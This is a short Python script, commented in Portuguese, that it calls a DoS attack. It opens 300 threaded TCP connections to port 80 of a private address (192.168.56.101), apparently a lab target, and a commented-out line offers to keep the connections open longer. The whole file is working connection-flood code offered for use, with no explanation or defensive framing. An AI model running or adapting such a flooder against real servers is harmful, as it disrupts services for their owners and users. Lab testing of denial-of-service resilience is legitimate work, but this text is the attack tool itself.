import socket, time, threading

TARGET = "192.168.56.101" # IP do alvo
PORT = 80                 # Nº da porta
CONNS = 300               # Total de conexões a serem abertas
CONCURRENCY = 200
DELAY = 0.01              # Intervalo entre conexões (s)

# Estabelece a conexão para o envio de pacotes
def make_conn(idx):
    try:
        s = socket.socket()
        s.settimeout(1)
        s.connect((TARGET, PORT))
        # time.sleep(5) # Opcional: não fechar imediatamente para manter conexões abertas
        s.close()

    except Exception:
        pass

# Cria a thread do ataque de DoS
threads = []
for i in range(CONNS):
    t = threading.Thread(target=make_conn, args=(i,))
    t.start()
    threads.append(t)
    time.sleep(DELAY)

# Executa o ataque
for t in threads:
    t.join()
print("Teste DoS concluído.")
